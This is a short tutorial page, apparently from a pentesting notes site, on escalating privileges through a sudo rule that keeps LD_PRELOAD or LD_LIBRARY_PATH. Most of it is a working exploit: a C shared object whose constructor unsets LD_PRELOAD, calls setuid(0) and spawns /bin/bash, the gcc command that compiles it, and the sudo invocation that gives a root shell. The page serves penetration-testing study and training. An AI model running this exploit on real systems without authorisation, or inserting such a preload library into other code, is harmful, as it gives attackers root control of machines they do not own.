---
title: Sudo Privilege Escalation by Overriding Shared Library
description: LD_PRELOAD and LD_LIBRARY_PATH might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-10-26
draft: false
---

## LD_PRELOAD, LD_LIBRARY_PATH Overwriting

### Investigation

Check sudo commands.

```sh
sudo -l
```

The below is the output example.

```bash
env_keep+=LD_PRELOAD

(ALL : ALL) NOPASSWD: somecmd
```

If we find the sudo command keeps **LD_PRELOAD** environment, we can overwrite this variable to load our custome shared object and escalate the privileges.  

Also, we can replace the **LD_PRELOAD** with **LD_LIBRARY_PATH**.

By the way, to list shared libraries required by the executable, use `ldd` command.

```sh
ldd somecmd
```

### Exploitation

First off, create **exploit.c** under **/tmp** .

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

- The **"constructor"** attribute is a special type of function attribute in GCC. It tells the compiler to automatically call the function before the main function.

Now compile the c program to shared object.

```bash
# -fPIC: Generate Position Independent Code.
# -shared: Generate a shared library.
# -o: Output shared object.
gcc  -fPIC -shared -o exploit.so exploit.c
```

We can execute command with setting the shared library to **LD_PRELOAD** variable then spawn the root shell.

```bash
sudo LD_PRELOAD=/tmp/exploit.so somecmd
```
